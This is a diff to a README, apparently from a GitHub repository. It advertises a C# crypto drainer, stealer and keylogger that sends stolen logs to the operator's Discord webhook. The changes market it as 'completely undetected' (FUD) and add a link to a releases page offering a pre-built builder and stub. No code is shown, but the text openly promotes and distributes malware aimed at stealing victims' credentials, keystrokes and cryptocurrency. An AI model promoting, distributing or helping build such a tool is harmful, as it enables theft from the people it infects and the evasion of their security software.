@@ -1,6 +1,6 @@
 <p align="center">
-  <b>Crypto drainer + Stealer + Keylogger</b> <br>
-  <i>Stealer written on C#, logs will be sent to your Discord channel using a webhook.</i>
+  <b>COMPLETELY UNDETECTED Crypto drainer + Stealer + Keylogger</b> <br>
+  <i>FUD-Stealer written on C#, logs will be sent to your Discord channel using a webhook.</i>
 </p>
 
 
@@ -41,5 +41,9 @@
 - [x] Product key
 - [x] Autorun module
 
-You can download a pre-built version under the RELEASE TAB
+ # Runtime requirements.
+ These are the requirement for the dowload in release tab [Releases](https://github.com/RedIsSus/FUD-Builder/releases) (FUD-Builder.zip)
+ - Builder.exe ([NET Runtime 6.0.*](https://dotnet.microsoft.com/en-us/download/dotnet/6.0))
+ - Stub ([NET Framework 4.8](https://dotnet.microsoft.com/en-us/download/dotnet-framework/net48))
+
 
